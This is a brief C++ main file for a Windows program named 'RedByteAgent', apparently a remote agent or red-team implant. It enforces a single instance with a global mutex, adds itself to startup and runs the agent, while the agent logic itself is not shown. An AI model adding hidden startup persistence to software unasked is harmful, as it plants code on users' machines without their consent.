#include "Agent.h"
#include <windows.h>
#include "Startup.h"

int main(int argc, char *argv[]) {
    HANDLE hMutex = CreateMutexA(
        nullptr,
        TRUE,
        "Global\\RedByteAgentMutex"
    );

    // Agent already running
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        ExitProcess(0);
        return 0;
    }

    Startup::addToStartup();

    return Agent::run();
}